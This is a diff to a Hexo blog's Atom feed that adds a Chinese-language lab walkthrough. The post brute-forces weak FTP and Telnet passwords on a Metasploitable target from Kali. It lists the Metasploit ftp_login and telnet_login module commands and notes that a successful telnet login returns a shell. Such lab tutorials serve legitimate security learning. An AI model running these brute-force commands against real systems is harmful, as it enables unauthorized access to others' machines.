@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-12-08T01:14:59.647Z</updated>
+  <updated>2019-12-08T02:10:25.115Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,35 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>FTP及Telnet弱口令渗透</title>
+    <link href="http://yoursite.com/2019/12/08/FTP%E5%8F%8ATelnet%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%B8%97%E9%80%8F/"/>
+    <id>http://yoursite.com/2019/12/08/FTP%E5%8F%8ATelnet%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%B8%97%E9%80%8F/</id>
+    <published>2019-12-08T01:40:40.000Z</published>
+    <updated>2019-12-08T02:10:25.115Z</updated>
+    
+    <content type="html"><![CDATA[<hr><hr><p>通过msf实现ftp和telnet弱口令渗透：</p><p>​    靶机：Metasploitable  （192.168.157.133）</p><p>​    攻击机：Kali （192.168.157.132）</p><p>1.使用-p-对靶机进行扫描，ftp对应的端口是21端口</p><p><img src="https://img.vim-cn.com/ee/80191c10caa90f4013bd5e7d30bd74346b64aa.png" alt="1"></p><p>2.输入msfconsole进入搜索ftp_login暴力破解模块</p><p><img src="https://img.vim-cn.com/12/61a039d735e31011038895a9b4c6f6b60ede2e.png" alt="2"></p><p>3.利用漏洞模块，设置参数</p><p><img src="https://img.vim-cn.com/dc/770d3125fb6e281143f20b07a4377b7cb0b146.png" alt="3"></p><p><img src="https://img.vim-cn.com/dc/a14bb87c197819f9222976c21cfc986fb435a0.png" alt="4"></p><p>msf5 &gt; use auxiliary/scanner/ftp/ftp_login</p><p>msf5 &gt; set RHOSTS 192.168.157.133</p><p>msf5 &gt; set USER_FILE username.txt</p><p>msf5 &gt; set PASS_FILE password.txt</p><p>msf5 &gt; exploit</p><p>可以看到通过暴力破解弱口令已经破解出用户名和密码了，我们就可以通过ftp登录靶机了</p><p>再来进行telnet的弱口令渗透：</p><p>还是先使用-p-对靶机进行扫描，telnet对应的端口是23端口</p><p><img src="https://img.vim-cn.com/ee/80191c10caa90f4013bd5e7d30bd74346b64aa.png" alt="1"></p><p>输入msfconsole进入搜索telnet_login暴力破解模块</p><p><img src="https://img.vim-cn.com/1f/63c4aadad9e252c80dade2e761ee2bdf97d926.png" alt="2"></p><p>利用漏洞模块，设置参数</p><p><img src="https://img.vim-cn.com/c9/ba7f11bbbc0b4a5e1b81d21267394b2d788c9e.png" alt="3"></p><p><img src="https://img.vim-cn.com/7e/777716b566e7c375526c9c4e88c3e7254ece0e.png" alt="4"></p><p>msf5 &gt; use auxiliary/scanner/telnet/telnet_login</p><p>msf5 &gt; set RHOSTS 192.168.157.133</p><p>msf5 &gt; set USER_FILE username.txt</p><p>msf5 &gt; set PASS_FILE password.txt</p><p>msf5 &gt; exploit</p><p><img src="https://img.vim-cn.com/41/9c3b5c3603601beddd19af3e89620e61ea24c3.png" alt="5"></p><p>telnet暴力破解如果破解成功会直接给返回shell，用sessions连接shell就可以对靶机进行操作了</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;hr&gt;
+&lt;hr&gt;
+&lt;p&gt;通过msf实现ftp和telnet弱口令渗透：&lt;/p&gt;
+&lt;p&gt;​    靶机：Metasploitable  （192.168.157.133）&lt;/p&gt;
+&lt;p&gt;​    攻击机：Kali （192.168.157.132）&lt;/p&gt;
+&lt;p&gt;1.使用-p-对
+      
+    
+    </summary>
+    
+    
+    
+      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>Mysql数据库</title>
